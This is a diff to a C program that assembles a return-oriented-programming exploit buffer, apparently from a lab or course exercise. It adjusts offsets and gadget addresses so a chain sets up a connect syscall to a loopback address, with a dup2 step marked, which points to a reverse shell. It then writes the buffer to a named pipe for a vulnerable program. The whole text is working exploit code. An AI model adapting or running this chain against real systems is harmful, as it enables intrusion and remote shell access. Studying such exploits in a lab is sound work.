@@ -47,7 +47,7 @@ int main(void)
   // connect syscall
   char con_arg[] = "\x62\x01\x01\x01";
 
-  char con_arg_3_addr[] = "\x90\x68\xbf\xbf"; // bufr + 371
+  char con_arg_3_addr[] = "\x94\x68\xbf\xbf"; // bufr + 375
   
   char con_arg_ip[] = "\x7f\x01\x01\x01";
   char con_arg_ip_mask[] = "\xff\xf0\xf0\xff";
@@ -65,7 +65,7 @@ int main(void)
   char sockaddr_in_addr[] = "\x28\x68\xbf\xbf"; // buf + 267
 
   char con_arg_16_seed[] = "\x01\x01\x01\xf0";
-  char con_arg_16_addr[] = "\x98\x68\xbf\xbf"; // bufr + 379
+  char con_arg_16_addr[] = "\x9c\x68\xbf\xbf"; // bufr + 383
 
   int i;
   // Fill up buffer
@@ -172,19 +172,20 @@ int main(void)
   strcpy(bufr + 351, xor_eax); // 0xbba9b3c2
   // pop connect arg into edx
   strcpy(bufr + 355, pop_edx); // 0xbbb9dc1b
+  strcpy(bufr + 359, con_arg_16_seed);
   // add first 8 bits of edx to eax
-  strcpy(bufr + 359, add_dl_al); // 0xbbbb4607
+  strcpy(bufr + 363, add_dl_al); // 0xbbbb4607
                                 // eax should have 0x62
   // trap into connect syscall
-  strcpy(bufr + 363, trap);  // 0xbba9b6e5, location is 0xbfbf6868
+  strcpy(bufr + 367, trap);  // 0xbba9b6e5, location is 0xbfbf688c
   // jump 12 bytes
-  strcpy(bufr + 367, jump_12);
+  strcpy(bufr + 371, jump_12);
   // hardcoded file descriptor
-  strcpy(bufr + 371, "\x01\x01\x01\x01");
+  strcpy(bufr + 375, "\x01\x01\x01\x01");
   // store address of socketaddr_in struct
-  strcpy(bufr + 375, sockaddr_in_addr);
+  strcpy(bufr + 379, sockaddr_in_addr);
   // 4 byte value 16
-  strcpy(bufr + 379, "\x01\x01\x01\x01");
+  strcpy(bufr + 383, "\x01\x01\x01\x01");
   //----------------------------------------------------------------------------------------- dup2 #1
   writecmd(PIPEPATH, bufr);
   
